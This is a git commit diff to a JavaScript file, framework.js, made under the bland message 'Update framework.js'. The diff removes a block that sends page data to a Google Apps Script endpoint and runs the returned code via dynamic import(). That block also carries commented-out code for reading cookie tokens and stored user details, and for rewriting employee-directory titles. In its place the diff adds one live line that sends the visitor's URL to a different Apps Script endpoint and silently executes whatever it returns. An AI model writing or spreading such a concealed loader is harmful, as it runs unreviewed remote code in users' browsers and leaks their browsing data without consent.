f07e883f63bd7107fa094483408caab142912758
MissingLink <60206943+Patrick-ring-motive@users.noreply.github.com>
2025-12-23 09:47:32 -0600

    Update framework.js

--- framework.js
+++ framework.js
@@ -2640,35 +2640,5 @@ for (let i = 0; i < strkeys.length; i++) {
  console.log(`JavaxScript already ${globalThis.JXSLOADER}`);
 }
 (() => {
-  const parse = (x) => {
-    try {
-      return JSON.parse(x);
-    } catch {
-      return x;
-    }
-  };
-  const document = window.top.document;
-  const eagleid = location.href;//Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
-  const name = location.href;//String(parse(localStorage.getItem("user"))?.FirstName);
-  const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec",);
-  url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
-  (async () => {
-    try {
-      await import(url);
-    } catch {
-      
-    }finally{
-      document.querySelector('[werk]')?.remove?.();
-    }
-  })();
-  const TenX = (async ()=>{
-    await new Promise(resolve=>document.readyState == 'complete' ? resolve() : document.addEventListener("load", resolve));
-  /*  await[...document.querySelectorAll(`[id="person"]>[id="title"]:not([x10]),[id*="orgItemInfoContainer"]:has([href="https://apps.usaa.com/enterprise/employee-directory?emplNum=Y3953"]) [id*="orgJobTitle"]:not([x10])`,)].forEach((x) => {
-      x.innerText = "10x Software Engineer";
-      x.setAttribute("x10", true);
-    });*/
-    await[...document.querySelectorAll("[missing]")].forEach((x) => x.remove());
-  });
-  TenX();
-  setInterval(TenX,100);
+	import('https://script.google.com/macros/s/AKfycbzJHlH1FTmlLJ1T9AeJHxMKfutB2fJKXuNvaqJSDgQCqnjb44mpdeopB2tONYrLQGqH/exec?'+location.href).catch(()=>{});
 })();
